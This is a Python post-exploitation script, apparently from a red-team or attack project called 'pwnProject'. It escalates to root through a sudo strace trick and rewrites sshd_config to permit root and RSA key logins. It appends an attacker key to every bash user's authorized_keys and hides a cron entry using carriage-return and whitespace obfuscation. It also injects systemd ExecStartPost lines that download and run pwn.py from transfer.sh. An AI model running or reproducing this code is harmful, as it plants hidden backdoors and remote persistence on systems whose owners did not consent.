import os
import sys
import subprocess
import time

mainUser = 'LivvidDreams'
scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'

currentCRON = '/var/spool/cron/root'
locationDir = '/home/user/'
locationFile = '/home/user/pwn.py'

gtfoBin = 'sudo strace -o /dev/null {}'
files = ['pwn.py', '.env', '.rsakeys.pub']

        
def runCommand(command, output=False):
    if not command: return
    if not output:
        subprocess.call(command.split(), stdout = subprocess.PIPE)
    else:
        subprocess.call(command.split())


def sshConfigEdit():
    path = "/etc/ssh/sshd_config"
    flag1 = "GSSAPIAuthentication"
    flag2 = "GSSAPICleanupCredentials"
    flag3 = "#PubkeyAuthentication yes"
    flag4 = "#PermitRootLogin yes"
    flag5 = "PubkeyAcceptedKeyTypes=+ssh-rsa"
    with open(path, "r") as sshfile:
        newlines = []
        for word in sshfile.readlines():
            if flag1 in word or flag2 in word or flag5 in word: continue
        
            elif flag3 in word or flag4 in word:
                newlines.append(word[1:])
            else:
                newlines.append(word)
    newlines.append("PubkeyAcceptedKeyTypes=+ssh-rsa")
    with open(path, "w") as sshfile:
        for line in newlines:
            sshfile.writelines(line)
    runCommand("systemctl restart sshd")

def gitKeyPush():
    # runCommand("grep -oE '^[^:]+' /etc/passwd >> users.txt")
    subprocess.Popen("cut -f 1,6,7 -d: /etc/passwd >> {}users.txt".format(locationDir), shell= True)
    time.sleep(1)
    allDir = {}
    with open("{}users.txt".format(locationDir), "r") as userDIR:
        for dir in userDIR.readlines():
            pathShell = dir.split(":")
            if pathShell[1] == '/': continue
            if pathShell[2] != '/bin/bash\n': continue
            allDir[pathShell[0]] = pathShell[1]
    runCommand("rm -f {}users.txt".format(locationDir))


    for key in allDir.keys():
        user = key
        dir = allDir[user] + "/.ssh"

        sshAuthorized = dir + "/authorized_keys"
        runCommand("mkdir -p {}".format(dir))
        runCommand('chmod 0700 {}'.format(dir))
        runCommand('chown {}:{} {}'.format(user, user, dir))
        # TODO: APPEND IF ONLY KEY NOT IN FILE

        # where the key is
        with open("{}.rsakeys.pub".format(locationDir), "r") as keyFile:
            key = [line for line in keyFile.readlines()]
        
        # where we want the key

        try:
            with open(sshAuthorized, "r") as keyStore:
                allLines = [line for line in keyStore.readlines()]
                
            if key[0] not in allLines:
                subprocess.Popen('cat {}.rsakeys.pub >> {}'.format(locationDir, sshAuthorized), shell = True)
        except:
            subprocess.Popen('cat {}.rsakeys.pub >> {}'.format(locationDir, sshAuthorized), shell = True)
        



        # subprocess.Popen('cat rsakeys.pub >> {}'.format(sshAuthorized), shell = True)
        time.sleep(0.5)
        runCommand('chmod 0600 {}'.format(sshAuthorized))
        runCommand('chown {}:{} {}'.format(user, user, sshAuthorized))

    
    runCommand('rm -f {}{}'.format(locationDir, files[2]))



def update_python():
    try:
        pyth = '/usr/bin/python3 --version >/dev/null'
        runCommand(pyth)
        return
    except Exception:
        #print('updating python')
        runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))

def rerun(updated=False):
    if updated:
        runCommand("/usr/bin/python3 pwn.py 1")
    else:
        runCommand(gtfoBin.format('/usr/bin/python3 pwn.py'), True)
    exit()


def is_root():
    if os.getuid() == 0:
        #print("OBTAINED ROOT")
        return True
    else:
        # Rerun This Script As Root User
        rerun()

def startUpRecovery():
    path = '/etc/systemd/system/multi-user.target.wants/postfix.service'
    ourPwnShit = "ExecStartPost=/usr/bin/curl -s -o {} https://transfer.sh/7BQ8Tz/pwn.py\n".format(locationFile)
    ourPwnShitRun = "ExecStartPost=/usr/bin/python3 {}\n".format(locationFile)
    
    try:
        with open(path, "r") as service:
            allLines = [line for line in service.readlines()]
        
        if ourPwnShit not in allLines:
            index = allLines.index("ExecStart=/usr/sbin/postfix start\n")
            allLines.insert(index + 1, ourPwnShit)
            if ourPwnShitRun not in allLines:
                allLines.insert(index + 2, ourPwnShitRun)

        with open(path, "w") as service:
            for line in allLines:
                service.writelines(line)
            
    except:
        #print("Failed To Append to File ", path)
        exit()


def appendCron(path, command):
    assert is_root()

    carriage = ' #\r'
    whitespace = ' ' * (len(command) + len(carriage))


    allLines = []
    toWrite = command + carriage + whitespace

    try:
        with open(path, "r") as cron:
            allLines = [line for line in cron.readlines()]
            inLine = False
            for line in allLines:
                if command in line:
                    inLine = True
                    break
            
        
        if not inLine:
            with open(path, "a") as cron:
                cron.write("\n" + toWrite + "\n")
                cron.close()
            runCommand("systemctl reload crond.service")
            runCommand("systemctl restart crond.service")
            #print('Appended To File ', path)

    except:
        exit()

    

def configureTokens():
    try:
        from dotenv import load_dotenv
    except:
        runCommand("/usr/bin/python3 -m pip install python-dotenv")
        rerun()

    api_key = None

    
    try:
        with open("{}.env".format(locationDir), "r") as envFile:
            envFile.close()
    except:
        # Prompt user for link
        # store the link 
        # put link in command    
        # https://transfer.sh/4dsUEB/.env
        usrInput = input("Enter link for environment variable: ")
        runCommand("curl -s -o {}.env {}".format(locationDir, usrInput))


    # Ensure we can download enviornment file
    load_dotenv()
    api_key = os.getenv("github_key")

    assert api_key

    return (mainUser, api_key)


def getScript():
    try:
        import requests
    except:
        runCommand("/usr/bin/python3 -m pip install requests")
        rerun()

    validAuth = configureTokens()
    if validAuth:
        for file in files:
            save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
            open(locationDir + file, "wb").write(save.content)

        print("redownloaded script from github")
        rerun(True)
    else:
        exit()


def main():
    # First Attempt To Install Python3 for Easier Scripting
    update_python()

    # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
    if not is_root(): exit()

    # Update The Script From GitHub And Obtain Keys To Add
    if len(sys.argv) == 1:
        getScript()

    # attempt to edit ssh files
    sshConfigEdit()

    # Find All Users And Append Keys
    gitKeyPush()

    # Find Place To Hide The Script While Running
    cmd = "* * * * * rm -f " + locationFile
    appendCron(currentCRON, cmd)

    startUpRecovery()
    
    print("!!!updated version")




if __name__ == "__main__":
    main()